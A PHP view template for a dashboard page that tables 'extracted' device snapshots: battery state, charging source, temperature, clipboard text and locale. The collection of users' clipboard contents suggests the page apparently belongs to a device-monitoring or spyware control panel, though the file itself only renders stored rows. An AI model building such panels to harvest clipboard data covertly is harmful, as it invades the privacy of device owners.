<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-battery-three-quarters text-secondary mr-2"></i>Device Context</h1>
                        <span class="badge badge-secondary border p-2 text-white"><i class="fas fa-database mr-1"></i> Total: <b><?= $total ?? 0 ?></b></span>
                    </div>
                    <p class="text-muted mt-1 mb-0">Battery state, clipboard content and locale settings</p>
                </div>
                <div class="col-lg-5 text-right"><?= $nav_urls ?></div>


            </div>
        </div>
    </section>
    <section class="content"><div class="container-fluid"><div class="row"><div class="col-12">
        <div class="card card-secondary shadow-sm">
            <div class="card-header">
                <h3 class="card-title"><i class="fas fa-list mr-2"></i>Snapshots <small class="text-muted ml-2"><?= count($rows) ?> entries</small></h3>
                <div class="card-tools"><button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i></button></div>
            </div>
            <div class="card-body p-0">
                <div class="table-responsive">
                    <table class="table table-hover table-striped mb-0">
                        <thead class="thead-light">
                        <tr>
                            <th><i class="fas fa-battery-half text-success mr-1"></i> Battery</th>
                            <th><i class="fas fa-plug text-warning mr-1"></i> Charging</th>
                            <th><i class="fas fa-thermometer-half text-danger mr-1"></i> Temp/Voltage</th>
                            <th><i class="fas fa-clipboard text-info mr-1"></i> Clipboard</th>
                            <th><i class="fas fa-globe text-primary mr-1"></i> Locale</th>
                            <th><i class="fas fa-clock text-muted mr-1"></i> Extracted</th>
                            <th class="text-center"><i class="fas fa-cogs mr-1"></i> Actions</th>
                        </tr>
                        </thead>
                        <tbody>
                        <?php if (empty($rows)): ?>
                            <tr><td colspan="7" class="text-center py-5">
                                <div class="empty-state"><i class="fas fa-battery-quarter fa-3x text-muted mb-3"></i><h4>No device context data</h4><p class="text-muted">Data will appear here once extracted</p></div>
                            </td></tr>
                        <?php else: foreach ($rows as $r): ?>
                            <?php
                                $lvl     = $r['battery_level_percent'] ?? 0;
                                $barCol  = $lvl > 50 ? 'success' : ($lvl > 20 ? 'warning' : 'danger');
                                $ts      = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
                                $clip    = $r['clipboard_text'] ?? null;
                            ?>
                            <tr>
                                <td>
                                    <div class="d-flex align-items-center">
                                        <div class="progress mr-2" style="width:55px;height:10px;border-radius:4px;">
                                            <div class="progress-bar bg-<?= $barCol ?>" style="width:<?= $lvl ?>%"></div>
                                        </div>
                                        <span class="font-weight-bold"><?= number_format($lvl, 0) ?>%</span>
                                    </div>
                                    <small class="text-muted"><?= htmlspecialchars($r['battery_health'] ?? '') ?></small>
                                </td>
                                <td>
                                    <span class="badge badge-<?= $r['battery_is_charging'] ? 'success' : 'secondary' ?>">
                                        <i class="fas fa-<?= $r['battery_is_charging'] ? 'bolt' : 'times' ?> mr-1"></i>
                                        <?= $r['battery_is_charging'] ? 'Charging' : 'Discharging' ?>
                                    </span>
                                    <?php if ($r['battery_plugged_usb']): ?><span class="badge badge-info ml-1"><i class="fas fa-usb mr-1"></i>USB</span><?php endif; ?>
                                    <?php if ($r['battery_plugged_ac']): ?><span class="badge badge-warning ml-1"><i class="fas fa-plug mr-1"></i>AC</span><?php endif; ?>
                                </td>
                                <td>
                                    <div><i class="fas fa-thermometer-half text-danger mr-1"></i><?= $r['battery_temperature_celsius'] ?? 'N/A' ?> °C</div>
                                    <small class="text-muted"><?= number_format($r['battery_voltage_mv'] ?? 0) ?> mV</small>
                                </td>
                                <td>
                                    <?php if ($clip): ?>
                                        <span class="badge badge-info" data-toggle="tooltip" title="<?= htmlspecialchars($clip) ?>">
                                            <i class="fas fa-clipboard-check mr-1"></i><?= mb_strimwidth(htmlspecialchars($clip), 0, 22, '…') ?>
                                        </span>
                                    <?php else: ?><span class="text-muted">—</span><?php endif; ?>
                                </td>
                                <td>
                                    <div><i class="fas fa-globe mr-1 text-primary"></i><?= htmlspecialchars($r['locale_display_language'] ?? '') ?> / <?= htmlspecialchars($r['locale_display_country'] ?? '') ?></div>
                                    <small class="text-muted"><i class="fas fa-clock mr-1"></i><?= htmlspecialchars($r['locale_timezone'] ?? '') ?></small>
                                </td>
                                <td><?= $ts ?></td>
                                <td class="text-center">
                                    <button class="btn btn-sm btn-outline-danger delete-row"
                                            data-id="<?= $r['id'] ?? '' ?>"
                                            data-url="<?= base_url('advanced/device/delete') ?>"
                                            title="Delete this row">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </td>
                            </tr>
                        <?php endforeach; endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            <div class="card-footer"><div class="float-right"><?php if (isset($pager)): ?><?= $pager->links('default', 'bootstrap5_full') ?><?php endif; ?></div></div>
        </div>
    </div></div></div></section>
</div>
<?php include __DIR__ . '/_adv_style.php'; ?>
<?php include __DIR__ . '/_adv_delete_script.php'; ?>
